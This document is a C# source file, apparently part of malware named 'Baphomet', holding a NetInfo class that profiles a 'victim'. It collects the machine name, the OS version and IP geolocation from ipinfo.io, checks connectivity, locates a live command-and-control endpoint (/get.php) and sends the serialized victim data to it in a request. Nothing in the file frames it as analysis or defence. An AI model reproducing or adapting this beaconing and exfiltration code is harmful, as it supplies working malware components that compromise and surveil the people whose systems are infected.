using System;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using Baphomet.Models;
using Newtonsoft.Json;

namespace Baphomet.Utilities;

public class NetInfo
{
	public VictimInfoDTO GetVictimInfo()
	{
		string machineName = Environment.MachineName.ToString();
		string versionString = Environment.OSVersion.VersionString;
		using StreamReader streamReader = new StreamReader(WebRequest.Create("https://ipinfo.io/").GetResponse().GetResponseStream());
		VictimInfoDTO victimInfoDTO = JsonConvert.DeserializeObject<VictimInfoDTO>(streamReader.ReadToEnd());
		victimInfoDTO.MachineName = machineName;
		victimInfoDTO.MachineOs = versionString;
		return victimInfoDTO;
	}

	public bool CheckInternetConnection()
	{
		try
		{
			if (new Ping().Send(IPAddress.Parse("8.8.8.8")).Status == IPStatus.Success)
			{
				return true;
			}
			return false;
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			return false;
		}
	}

	public string HostName()
	{
		string text = "noLive";
		string text2 = "/get.php";
		string[] array = new string[1] { "https://localhost:44363/Images/logo.jpg" };
		foreach (string text3 in array)
		{
			try
			{
				WebClient webClient = new WebClient();
				try
				{
					using (webClient.OpenRead(text3))
					{
						text = text3;
					}
				}
				finally
				{
					((IDisposable)webClient)?.Dispose();
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine("Error:" + ex.Message);
				continue;
			}
			break;
		}
		if (text != "noLive")
		{
			int num = text.LastIndexOf("/");
			if (num > 0)
			{
				text = text.Substring(0, num);
			}
			return text + text2 + "?info=";
		}
		return text;
	}

	public void SendData(VictimInfoDTO victimInfo, string host)
	{
		string text = JsonConvert.SerializeObject((object)victimInfo);
		string address = host + text;
		new WebClient().DownloadString(address);
	}
}
